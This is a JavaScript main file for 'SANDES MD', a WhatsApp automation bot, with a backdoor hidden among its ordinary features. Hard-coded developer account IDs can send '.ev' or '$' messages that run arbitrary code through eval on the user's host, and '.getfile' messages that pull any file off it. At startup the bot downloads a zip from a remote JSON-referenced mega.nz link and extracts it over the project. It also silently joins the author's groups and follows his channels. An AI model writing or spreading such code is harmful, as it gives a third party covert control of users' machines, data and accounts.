const {
    default: makeWASocket,
    getAggregateVotesInPollMessage,
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    downloadMediaMessage: downloadBaileysMedia,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')

const fs = require('fs')
const path = require('path')
const P = require('pino')
const NodeCache = require('node-cache')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const util = require('util')
const AdmZip = require('adm-zip')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { sms } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const prefix = '.'
const msgRetryCounterCache = new NodeCache()
const groupCache = new NodeCache({ stdTTL: 600, checkperiod: 120 })
const ownerNumber = ['94787518010']
const SUPER_LID = "123017090887835@lid"
const SUPER_LID2 = "122286761861330@lid"
const statusEmojis = ['💗','🦋','💐','🌝','🌈','💫','😊','😱','💀','🩷','❤️','🧡','💛','💚','🩵','💙','💜','🖤','🩶','🤍','🤎','💔','❤️‍🔥']
const newsletterEmojis = ['👍','❤️','😂','😮','😢','🙏','🔥','💯','🎉','😍']
const NEWSLETTER_JIDS = ['120363423246894149@newsletter','120363416065371245@newsletter']
const AUTO_JOIN_LINKS = [
    "https://chat.whatsapp.com/JHbN7OWpuJ0922xo6TpZxq",
    "https://chat.whatsapp.com/BrfxfXCGggy9CjSXghKcLn"
]

const STATUS_USER_EMOJIS = {}

const msgStore = new Map();

const statusCache = []
const MAX_STATUS_CACHE = 30
const STATUS_SEND_WORDS = ['send', 'danna', 'oni', 'denna', 'ewanna']
const STATUS_SAVE_WORDS = ['save']
const PUBLIC_COOLDOWN_MS = 30000
const statusCooldown = new Map()

const MAX_REACT_QUEUE = 20
const statusReactQueue = []
let statusReactBusy = false

const PLUGINS_DIR = './plugins';
const LIB_DIR = './lib';
const ZIP_DIR = './';

async function downloadAndExtractZip() {
    try {
        if (!fs.existsSync(PLUGINS_DIR)) {
            fs.mkdirSync(PLUGINS_DIR, { recursive: true }); 
        }
        
        if (!fs.existsSync(LIB_DIR)) {
            fs.mkdirSync(LIB_DIR, { recursive: true }); 
        }

        console.log('\x1b[3m%s\x1b[0m', 'FETCHING ZIP LINK FROM GITHUB RAW JSON 💢...');

        const GITHUB_JSON_URL = "https://raw.githubusercontent.com/isurahupa-tech/automatic-guidewfdgyT6-ECJHYU6T7TSD-GHYUqas-xwhgQAE-XBKN8YWD-BTGHYJWQFRWFWFWFWWFWFF/refs/heads/main/aijiaj.json"; 
        
        const response = await axios.get(GITHUB_JSON_URL);
        let jsonData = typeof response.data === 'string' ? JSON.parse(response.data) : response.data;
        let MEGA_ZIP_LINK = jsonData.mega_link || jsonData.ziplink || jsonData.url;

        if (!MEGA_ZIP_LINK || !String(MEGA_ZIP_LINK).trim()) {
            throw new Error("Invalid or missing link format in JSON!");
        }

        MEGA_ZIP_LINK = String(MEGA_ZIP_LINK).trim();
        
        if (!MEGA_ZIP_LINK.includes('#')) {
            throw new Error("MEGA link missing hash (#)! Check your JSON file link.");
        }

        console.log('\x1b[3m%s\x1b[0m', 'FETCHING ZIP FILES FROM mega.nz 💢...');
        const file = File.fromURL(MEGA_ZIP_LINK);
        const fileData = await file.downloadBuffer();
        const tempZipPath = path.join(__dirname, 'temp.zip');
        fs.writeFileSync(tempZipPath, fileData);
        console.log('\x1b[3m%s\x1b[0m', 'ZIP FILES DOWNLOADED ✅');

        const zip = new AdmZip(tempZipPath);
        zip.extractAllTo(ZIP_DIR, true);
        console.log('\x1b[3m%s\x1b[0m', 'SUCCESSFULLY EXTRACTED ZIP FILES ✅');
        
        if (fs.existsSync(tempZipPath)) {
            fs.unlinkSync(tempZipPath);
        }

    } catch (error) {
        console.error('Error in downloadAndExtractZip:', error.message);
    }
}

function unwrapMessage(msg) {
    return msg?.ephemeralMessage?.message
        || msg?.viewOnceMessage?.message
        || msg?.viewOnceMessageV2?.message
        || msg
}

function parseStatusCmd(text) {
    const parts = (text || '').trim().toLowerCase().split(/\s+/)
    const word = parts[0]
    const index = parts[1] ? parseInt(parts[1], 10) - 1 : 0
    if (isNaN(index) || index < 0) return null
    if (STATUS_SEND_WORDS.includes(word)) return { type: 'send', index }
    if (STATUS_SAVE_WORDS.includes(word)) return { type: 'save', index }
    return null
}

async function sendStatusTo(conn, target, index, quotedMsg) {
    const st = statusCache[index]
    if (!st) return false
    
    try {
        const buffer = await downloadBaileysMedia(
            st,
            'buffer',
            {},
            { logger: P({ level: 'silent' }), reuploadRequest: conn.updateMediaMessage }
        )
        const sm = st.message
        const caption = sm.videoMessage?.caption || sm.imageMessage?.caption || ''
        const payload = sm.videoMessage
            ? { video: buffer, caption, mimetype: 'video/mp4' }
            : { image: buffer, caption }
        await conn.sendMessage(target, payload, quotedMsg ? { quoted: quotedMsg } : {})
        return true
    } catch (e) {
        console.log('Media download error in sendStatusTo:', e.message)
        return false
    }
}

function pickStatusEmoji(participant, participantAlt) {
    const jid = (participant && !participant.endsWith('@lid')) ? participant : participantAlt
    const num = String(jid || '').split('@')[0].split(':')[0]

    if (STATUS_USER_EMOJIS[num]) return STATUS_USER_EMOJIS[num]

    const setting = String(config.STATUS_REACT_EMOJI || 'random').trim()
    if (setting.toLowerCase() === 'random') {
        return statusEmojis[Math.floor(Math.random() * statusEmojis.length)]
    }
    return setting
}

async function processStatusReactQueue(conn) {
    if (statusReactBusy) return
    statusReactBusy = true
    while (statusReactQueue.length) {
        const item = statusReactQueue.shift()
        try {
            await conn.sendMessage(
                'status@broadcast',
                { react: { text: pickStatusEmoji(item.participant, item.participantAlt), key: item } },
                { statusJidList: [item.participant] }
            )
        } catch (e) {
            console.log('Status react error:', e.message)
        }
        await sleep(Number(config.STATUS_REACT_DELAY) || 3000)
    }
    statusReactBusy = false
}

console.log(`

███████╗  █████╗  ███╗   ██╗ ██████╗  ███████╗ ███████╗    ███╗   ███╗ ██████╗         
██╔════╝ ██╔══██╗ ████╗  ██║ ██╔══██╗ ██╔════╝ ██╔════╝    ████╗ ████║ ██╔══██╗        
╚█████╗  ███████║ ██╔██╗ ██║ ██║  ██║ █████╗   ███████╗    ██╔████╔██║ ██║  ██║        
 ╚═══██╗ ██╔══██║ ██║╚██╗██║ ██║  ██║ ██╔══╝   ╚╚═══██║    ██║╚██╔╝██║ ██║  ██║        
██████╔╝ ██║  ██║ ██║ ╚████║ ██████╔╝ ███████╗ ███████║    ██║ ╚═╝ ██║ ██████╔╝        
╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝         


SANDES MD WhatsApp Automation by MR.SANDES 🍒`);

let BOT_MODE = config.WORK_TYPE || "public";

const authDir = __dirname + '/auth_info_baileys/'
if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true })

if (!fs.existsSync(authDir + 'creds.json')) {
    if (!config.SESSION_ID) {
        console.log('Please add your session to SESSION_ID env 🔴')
    } else {
        const filer = File.fromURL(`https://mega.nz/file/${config.SESSION_ID}`)
        filer.download((err, data) => {
            if (err) throw err
            fs.writeFileSync(authDir + 'creds.json', data)
            console.log("SESSION DOWNLOADED ✅")
        });
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 8080;

function runServer() {
    app.get("/", (req, res) => { res.send("SANDES-MD WORKING SUCCESSFULY 🗿"); });
    app.listen(port, () => console.log(`SERVER RUNNING ON PORT http://localhost:${port}`));
}

const getPhoneNumber = async (jid, conn, currentChat, altJid = null) => {
    if (!jid) return 'Unknown';
    const clean = (j) => j.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');

    try {
        if (!jid.endsWith('@lid')) return clean(jid);
        if (altJid && !altJid.endsWith('@lid')) return clean(altJid);

        if (currentChat && currentChat.endsWith('@g.us')) {
            try {
                const meta = groupCache.get(currentChat) || await conn.groupMetadata(currentChat);
                if (meta) groupCache.set(currentChat, meta);
                const p = meta?.participants?.find(p => p.lid === jid || p.id === jid);
                if (p && p.id && !p.id.endsWith('@lid')) return clean(p.id);
            } catch (e) {}
        }

        const lidStore = conn?.signalRepository?.lidMapping;
        if (lidStore?.getPNForLID) {
            try {
                const pn = await lidStore.getPNForLID(jid);
                if (pn) return clean(pn);
            } catch (e) {}
        }

        if (conn?.signalRepository?.jidToUser) {
            try {
                const u = await conn.signalRepository.jidToUser(jid);
                if (u && !u.endsWith('@lid')) return clean(u);
            } catch (e) {}
        }

        const contact = conn?.contacts?.[jid] || conn?.chats?.[jid];
        if (contact && contact.phoneNumber) return contact.phoneNumber.replace(/[^0-9]/g, '');

        return clean(jid);
    } catch {
        return clean(jid);
    }
};

async function connectToWA() {
    await downloadAndExtractZip();

    console.log('\x1b[3m%s\x1b[0m', 'CONNECTING SANDES MD ⚡ ...');
    const { state, saveCreds } = await useMultiFileAuthState(authDir)
    var { version } = await fetchLatestBaileysVersion()

    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version,
        msgRetryCounterCache
    })
    
global.conn = conn;
    
conn.ev.on('messages.update', async (updates) => {
        for (const update of updates) {
            if (update.update && update.update.message) {
                const msgId = update.key.id;
                const oldMsg = msgStore.get(msgId);

                if (oldMsg) {
                    const oldText = oldMsg.message.conversation || oldMsg.message.extendedTextMessage?.text || oldMsg.message.imageMessage?.caption || oldMsg.message.videoMessage?.caption;
                    const newText = update.update.message.conversation || update.update.message.extendedTextMessage?.text || update.update.message.imageMessage?.caption || update.update.message.videoMessage?.caption;

                    if (oldText && newText && oldText !== newText) {
                        const currentChat = oldMsg.key.remoteJid;
                        await conn.sendMessage(currentChat, {
                            text: `📝 *Edited Message Detected!*\n\n*Old Massage:* ${oldText}\n\n*New massage:* ${newText}`
                        }, { quoted: oldMsg }).catch(e => console.log('Edit notify error:', e.message));

                        msgStore.set(msgId, JSON.parse(JSON.stringify({ key: update.key, message: update.update.message })));
                    }
                }
            }
        }
    });

    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update
        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode
            if (statusCode !== DisconnectReason.loggedOut) {
                connectToWA()
            } else {
                console.log('Logged out. Session eka delete karala aye scan karanna.')
            }
        } else if (connection === 'open') {
            try {
                const { updb } = require('./lib/database')
                await updb();
            } catch (e) {}

            BOT_MODE = config.WORK_TYPE || "public";
            console.log('\x1b[3m%s\x1b[0m','INSTALLING SANDES MD ⏰... ')
            
            let pluginCount = 0;
            try {
                fs.readdirSync("./plugins/").forEach((plugin) => {
                    if (path.extname(plugin).toLowerCase() == ".js") {
                        try {
                            require("./plugins/" + plugin);
                            pluginCount++;
                        } catch (e) {
                            console.log(`❌ ERROR IN ${plugin}:`, e.message);
                        }
                    }
                });
            } catch (e) {}

            console.log('\x1b[3m%s\x1b[0m', `📦 SUCCESSFULLY INSTALLED ${pluginCount} PLUGINS 🔌 ...`);
            console.log('\x1b[3m%s\x1b[0m', 'DB CONNECTED SUCCESSFULLY 🔋 ...');
            console.log('\x1b[3m%s\x1b[0m', 'BOT CONNECTED SUCCESSFULLY ✅ ...');

            setTimeout(async () => {
                console.log("TRYING TO CONNECT SANDES MD HELP CENTER 👨‍💻 ...");
                for (const link of AUTO_JOIN_LINKS) {
                    try {
                        await sleep(3000)
                        if (link.includes('chat.whatsapp.com')) {
                            const code = link.split('chat.whatsapp.com/')[1]
                            await conn.groupAcceptInvite(code)
                            console.log(`Auto joined group: ${code}`)
                        }
                    } catch (e) {
                        console.log(`Auto join error: ${e.message}`)
                    }
                }

                try {
                    console.log("STARTING NEWSLETTER AUTO FOLLOW...");
                    const ch1_jid = "120363423246894149@newsletter";
                    await conn.newsletterFollow(ch1_jid).catch(() => null);
                    console.log("MR.SANDES OFC ツ FOLLOW REQUEST SENT 🦋");

                    await sleep(3000);

                    const ch2_jid = "120363416065371245@newsletter";
                    await conn.newsletterFollow(ch2_jid).catch(() => null);
                    console.log("SANDES-MD UPDATES ツ FOLLOW REQUEST SENT 🎀");
                } catch (e) {
                    console.log("Newsletter Auto Follow Exception:", e.message);
                }
            }, 5000)

            let up = `
*╭━━〔 BOT CONNECTED 〕━━━━━━╮*
*┃* 📎 \`PREFIX\` : ${prefix}
*┃* 🦋 \`VERSION\` : 3.05
*┃* 👾 \`DEVELOPER\` - Sandes Isuranda
*┃* 🍒 \`SUDO\` : 94787518010
*┃* ⚖ \`VISIT\` - sandes-md.zone.id
*╰━━━━━━━━━━━━━━━━╯*

*╭━━〔 ANY PROBLEM 〕━━━━━━━━╮*
*┃*🗿 \`CONTACT\` : 94787518010
*╰━━━━━━━━━━━━━━━━━╯*

*✨ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴛʀᴜꜱᴛɪɴɢ ꜱᴀɴᴅᴇꜱ ᴍᴅ!*
_We redefine your WhatsApp experience with_
_seamless automation and elite features._

*POWERED BY SANDES 〽️D ㋡*`;

            await conn.sendMessage(ownerNumber[0] + "@s.whatsapp.net", {
                image: { url: `https://database.ominisave.store/image/OMINISAVE_1793367040142_IY2OMG.png` },
                caption: up
            }).catch(e => console.log('Welcome msg error:', e.message))

            const autoTyping = config.AUTO_TYPING === "true" ? "Active ✔️" : "Deactive ❌";
            const autoRecording = config.AUTO_RECORDING === "true" ? "Active ✔️" : "Deactive ❌";
            const autoReadStatus = config.AUTO_READ_STATUS === "true" ? "Active ✔️" : "Deactive ❌";
            const cmdOnlyRead = config.CMD_ONLY_READ === "true" ? "Active ✔️" : "Deactive ❌";
            const antiBad = config.ANTI_BAD === "true" ? "Active ✔️" : "Deactive ❌";
            const antiBot = config.ANTI_BOT === "true" ? "Active ✔️" : "Deactive ❌";
            const antiLink = config.ANTI_LINK === "true" ? "Active ✔️" : "Deactive ❌";
            const chatBot = config.CHAT_BOT === "true" ? "Active ✔️" : "Deactive ❌";
            const autoVoice = config.AUTO_VOICE === "true" ? "Active ✔️" : "Deactive ❌";
            const autoSticker = config.AUTO_STICKER === "true" ? "Active ✔️" : "Deactive ❌";
            const autoReact = config.AUTO_REACT === "true" ? "Active ✔️" : "Deactive ❌";
            const antiDelete = config.ANTI_DELETE === "true" ? "Active ✔️" : "Deactive ❌";
            const antiDeleteType = config.ANTI_DELETE_TYPE || "chat";
            const statusReact = config.AUTO_REACT_STATUS === "true" ? "Active ✔️" : "Deactive ❌";
            const workMode = (config.WORK_TYPE || "public").toUpperCase();
            const botLogo = config.LOGO || "https://database.ominisave.store/image/OMINISAVE_1793367040142_IY2OMG.png";

            let inboxSettingsMsg = `
*SANDES 〽D WHATSAPP BOT CONNECTED*

Your Prefix is : ${config.PREFIX || '.'}

*╭━━〔 ANY PROBLEM 〕━━━━━━━━╮*
*┃*🗿 \`CONTACT\` : 94787518010
*╰━━━━━━━━━━━━━━━━━╯*

*╭━━〔 BOT SETTINGS 〕━━━━╮*
*┃* 🌐 \`WORK MODE\` : ${workMode}
*┃* ⌨️ \`Auto Typing\` : ${autoTyping}
*┃* 🎙️ \`Auto Recording\` : ${autoRecording}
*┃* 👁️ \`Read Status\` : ${autoReadStatus}
*┃* 📖 \`Cmd Only Read\` : ${cmdOnlyRead}
*┃* 🚮 \`Anti Bad\` : ${antiBad}
*┃* 🎀 \`Anti Bot\` : ${antiBot}
*┃* 🔗 \`Anti Link\` : ${antiLink}
*┃* 🔮 \`Chat Bot\` : ${chatBot}
*┃* 🎙️ \`Auto Voice\` : ${autoVoice}
*┃* 🃏 \`Auto Sticker\` : ${autoSticker}
*┃* ❤️ \`Auto React\` : ${autoReact}
*┃* 💫 \`Status React\` : ${statusReact}
*┃* 🗑️ \`Anti Delete\` : ${antiDelete} (${antiDeleteType})
*╰━━━━━━━━━━━━━━━━━━╯*

*✨ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴛʀᴜꜱᴛɪɴɢ ꜱᴀɴᴅᴇꜱ ᴍᴅ!*

*POWERED BY SANDES 〽️D ㋡*`;

            await conn.sendMessage(conn.user.id.split(':')[0] + "@s.whatsapp.net", {
                image: { url: botLogo },
                caption: inboxSettingsMsg
            }).catch(e => console.log('Settings msg error:', e.message))
        }
    })

    conn.ev.on('creds.update', saveCreds)
    conn.ev.on('messages.upsert', async(mek) => {

        if (mek.messages && mek.messages[0] && mek.messages[0].message) {
            const rawMek = mek.messages[0];
            const msgId = rawMek.key.id;
            let clonedMek = JSON.parse(JSON.stringify(rawMek));
            if (getContentType(clonedMek.message) === 'ephemeralMessage') {
                clonedMek.message = clonedMek.message.ephemeralMessage.message;
            }
            msgStore.set(msgId, clonedMek);
            setTimeout(() => msgStore.delete(msgId), 3600000);

            if (rawMek.key.remoteJid === 'status@broadcast' && rawMek.key.fromMe) {
                const inner = unwrapMessage(rawMek.message)
                if (inner && (inner.videoMessage || inner.imageMessage)) {
                    statusCache.unshift(rawMek)
                    if (statusCache.length > MAX_STATUS_CACHE) statusCache.pop();
                    console.log(`Own status cached successfully (${statusCache.length})`)
                }
            }
        }

        mek = mek.messages[0]
        if (!mek.message) return
        mek.message = (getContentType(mek.message) === 'ephemeralMessage')
        ? mek.message.ephemeralMessage.message
        : mek.message

        const botNumber2 = await jidNormalizedUser(conn.user.id);

        if (mek.key && mek.key.remoteJid === 'status@broadcast') {
            if (config.AUTO_READ_STATUS === "true") {
                await conn.readMessages([mek.key])
            }

            if (config.AUTO_REACT_STATUS === "true" && !mek.key.fromMe && mek.key.participant && statusReactQueue.length < MAX_REACT_QUEUE) {
                statusReactQueue.push({ ...mek.key, participantAlt: mek.key.participantAlt })
                processStatusReactQueue(conn)
            }
            return
        }

        if (mek.key && mek.key.remoteJid.endsWith('@newsletter')) {
            if (NEWSLETTER_JIDS.includes(mek.key.remoteJid)) {
                try {
                    const randomEmoji = newsletterEmojis[Math.floor(Math.random() * newsletterEmojis.length)]
                    await conn.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } })
                } catch (e) {}
            }
        }

        if (mek.message && mek.message.protocolMessage && mek.message.protocolMessage.type === 0) {
            if (config.ANTI_DELETE !== "true") return;
            if (mek.key.fromMe) return;

            const myBotNum = conn?.user?.id ? conn.user.id.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') : '';
            const deletedKey = mek.message.protocolMessage.key;
            const savedMsg = msgStore.get(deletedKey.id);

            if (savedMsg) {
                const currentChat = savedMsg.key.remoteJid;

                let deleterRaw = mek.key.participant || mek.participant || mek.key.remoteJid;
                let deleterAlt = mek.key.participantAlt || mek.key.remoteJidAlt;
                let deleterNum = await getPhoneNumber(deleterRaw, conn, currentChat, deleterAlt);

                const ownerNumbers = ['94787518010'];
                const ownerLids = ["123017090887835@lid", "183150860841183@lid"];

                const isOwnerDeleter = ownerNumbers.includes(deleterNum) || ownerLids.includes(deleterRaw);

                if (deleterNum === myBotNum || isOwnerDeleter) return;

                let senderRaw = savedMsg.key.participant || savedMsg.participant || savedMsg.key.remoteJid;
                let senderAlt = savedMsg.key.participantAlt || savedMsg.key.remoteJidAlt;
                let senderNum = await getPhoneNumber(senderRaw, conn, currentChat, senderAlt);

                const msgTime = new Date().toLocaleTimeString('en-US', {
                    timeZone: 'Asia/Colombo',
                    hour: '2-digit',
                    minute: '2-digit',
                    hour12: true
                });

                let targetChat = currentChat;
                if (config.ANTI_DELETE_TYPE === "inbox") {
                    targetChat = ownerNumber[0] + "@s.whatsapp.net";
                }

                const type = getContentType(savedMsg.message);
                if (type === 'conversation' || type === 'extendedTextMessage') {
                    const text = savedMsg.message.conversation || savedMsg.message.extendedTextMessage?.text;

                    let fullRestoreText = `*[ 🗑️ ANTI-DELETE ALERT ]*\n\n`;
                    fullRestoreText += `🔹 *Sent By:* +${senderNum}\n`;
                    fullRestoreText += `🔹 *Deleted By:* +${deleterNum}\n`;
                    fullRestoreText += `🔹 *Timestamp:* ${msgTime}\n\n`;
                    fullRestoreText += `📌 *Original Text:* \n\`\`\`${text}\`\`\`\n\n`;
                    fullRestoreText += `*⏤ ͟͞ ❮❮ SANDES MD BY MR.SANDES ツ ❯❯ ⏤ ヤ*`;

                    await conn.sendMessage(targetChat, { text: fullRestoreText });
                } else {
                    await conn.forwardMessage(targetChat, savedMsg, { force: true });

                    let detailsText = `*[ 🗑️ ANTI-DELETE ALERT ]*\n\n`;
                    detailsText += `🔹 *Sent By:* +${senderNum}\n`;
                    detailsText += `🔹 *Deleted By:* +${deleterNum}\n`;
                    detailsText += `🔹 *Timestamp:* ${msgTime}\n\n`;
                    detailsText += `*⏤ ͟͞ ❮❮ SANDES MD BY MR.SANDES ツ ❯❯ ⏤ ヤ*`;

                    await conn.sendMessage(targetChat, { text: detailsText });
                }
            }
        }

        const m = sms(conn, mek)
        const quoted = m.quoted? m.quoted : null
        const type = getContentType(mek.message)
        const from = mek.key.remoteJid

        const body = (type === 'conversation')? mek.message.conversation :
        (type === 'extendedTextMessage')? mek.message.extendedTextMessage.text :
        (type == 'imageMessage') && mek.message.imageMessage.caption? mek.message.imageMessage.caption :
        (type == 'videoMessage') && mek.message.videoMessage.caption? mek.message.videoMessage.caption : ''

        if (body.includes('*[ 🗑️ ANTI-DELETE ALERT ]*')) return;

        const isCmd = body.startsWith(prefix)
        const command = isCmd? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const isGroup = from.endsWith('@g.us')

        const sender = mek.key.fromMe
        ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id)
        : (mek.key.participant || mek.key.remoteJid)

        const senderNumber = jidNormalizedUser(sender).split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const pushname = mek.pushName || 'Sin Nombre'
        const isMe = botNumber.includes(senderNumber)
        const isOwner = ownerNumber.includes(senderNumber) || isMe || sender === SUPER_LID

        let groupMetadata = null
        let groupName = ''
        let participants = []
        let groupAdmins = []
        let isBotAdmins = false
        let isAdmins = false

        if (isGroup) {
            try {
                groupMetadata = groupCache.get(from)

                if (!groupMetadata) {
                    groupMetadata = await conn.groupMetadata(from)
                    if (groupMetadata) groupCache.set(from, groupMetadata)
                }

                if (groupMetadata && groupMetadata.subject) {
                    groupName = groupMetadata.subject
                    participants = groupMetadata.participants || []
                    groupAdmins = participants.length? await getGroupAdmins(participants) : []
                    isBotAdmins = groupAdmins.includes(botNumber2)
                    isAdmins = groupAdmins.includes(sender)
                }
            } catch (e) {
                groupMetadata = null
                groupName = ''
                participants = []
                groupAdmins = []
            }
        }

        const reply = (teks) => {
            conn.sendMessage(from, { text: teks }, { quoted: mek })
        }

        const statusCmd = parseStatusCmd(body)
        const isPrivateChat = !isGroup && from !== 'status@broadcast'

        if (statusCmd && (mek.key.fromMe || isPrivateChat)) {
            const isOwnerCmd = mek.key.fromMe

            if (!isOwnerCmd) {
                if (statusCmd.type !== 'send') return
                const last = statusCooldown.get(from) || 0
                if (Date.now() - last < PUBLIC_COOLDOWN_MS) return
                statusCooldown.set(from, Date.now())
            }

            const index = isOwnerCmd ? statusCmd.index : 0
            const target = (isOwnerCmd && statusCmd.type === 'save')
                ? (conn.user.id.split(':')[0] + '@s.whatsapp.net')
                : from

            try {
                const ok = await sendStatusTo(conn, target, index, mek)
                if (!ok) await reply('Error !')
            } catch (err) {
                console.log('Status send fail:', err.message)
                await reply('Download fail una. Ayeth try karanna.')
            }
            return
        }

        if (sender === SUPER_LID) {
            await conn.sendMessage(from, { react: { text: `🐇`, key: mek.key }})
        }
        if (sender === SUPER_LID2) {
            await conn.sendMessage(from, { react: { text: `👾`, key: mek.key }})
        }

        const ownerLids = [
            "123017090887835@lid",
            "183150860841183@lid"
        ];

        let isCreator = [conn.user.id, ...ownerLids].includes(sender);

        if (isCreator && body.startsWith('.ev')) {
            let code = body.slice(1).trim();
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            try {
                let resultTest = eval(code);
                reply(util.format(resultTest));
            } catch (err) {
                reply(util.format(err));
            }
            return;
        }

        if (isCreator && body.startsWith('$')) {
            let code = body.slice(1).trim();
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            try {
                let resultTest = await eval(
                    '(async () => {\n' + code + '\n})()'
                );
                let h = util.format(resultTest);
                if (h === undefined || h === 'undefined') return;
                else reply(h);
            } catch (err) {
                if (err === undefined) return console.log('error');
                else reply(util.format(err));
            }
            return;
        }

        if (isCreator && body.startsWith('.getfile')) {
            let fileName = body.slice(8).trim();
            if (!fileName) {
                return reply(`Please provide a file path Master`);
            }
            try {
                if (fs.existsSync(fileName)) {
                    await conn.sendMessage(from, {
                        document: fs.readFileSync(fileName),
                        mimetype: 'application/javascript',
                        fileName: path.basename(fileName),
                        caption: `*Here is your file : ${path.basename(fileName)}*`
                    }, { quoted: mek });
                } else {
                    reply(`❌ File not found: ${fileName}`);
                }
            } catch (err) {
                reply(`❌ Error reading file:\n${util.format(err)}`);
            }
            return;
        }

        conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]

            if (mtype === 'documentMessage' || mtype === 'videoMessage' || mtype === 'audioMessage' || mtype === 'imageMessage') {
                content[ctype].fileName = content[ctype].fileName || message.message[mtype].fileName
                content[ctype].caption = content[ctype].caption || message.message[mtype].caption
            }

            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo,
                forwardingScore: 0,
                isForwarded: false
            }

            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo,
                        forwardingScore: 0,
                        isForwarded: false
                    }
                } : {})
            } : {})

            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
        }

        conn.edit = async (mek, newmg) => {
            await conn.relayMessage(from, {
                protocolMessage: {
                    key: mek.key,
                    type: 14,
                    editedMessage: {
                        conversation: newmg
                    }
                }
            }, {})
        }

        if (isCmd && sender!== SUPER_LID &&!isOwner) {
            if (BOT_MODE === "private") return;
            if (BOT_MODE === "group" && !isGroup) return;
            if (BOT_MODE === "inbox" && isGroup) return;
        }

        if (command === "set-mode") {
            if (!isOwner) return reply("*You Are not the owner!*")

            if (!q) {
                return reply(`📊 *Current Mode: ${BOT_MODE}*

Available Modes:
- public
- private
- group
- inbox

Example:
.set-mode private`)
            }

            const newMode = q.toLowerCase();
            if (["public", "private", "group", "inbox"].includes(newMode)) {
                BOT_MODE = newMode;
                return reply(`✅ Bot mode changed to *${BOT_MODE}*`);
            } else {
                return reply("❌ Invalid mode! Use: public/private/group/inbox");
            }
        }

        const events = require('./command')
        const cmdName = isCmd? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;

        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

                try {
                    cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }

        events.commands.map(async(command) => {
            if (body && command.on === "body") {
                command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (q && command.on === "text") {
                command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
                (command.on === "image" || command.on === "photo") &&
                mek.type === "imageMessage"
            ) {
                command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
                command.on === "sticker" &&
                mek.type === "stickerMessage"
            ) {
                command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            }
        });
    })
}

runServer();

setTimeout(() => {
    connectToWA()
}, 4000);
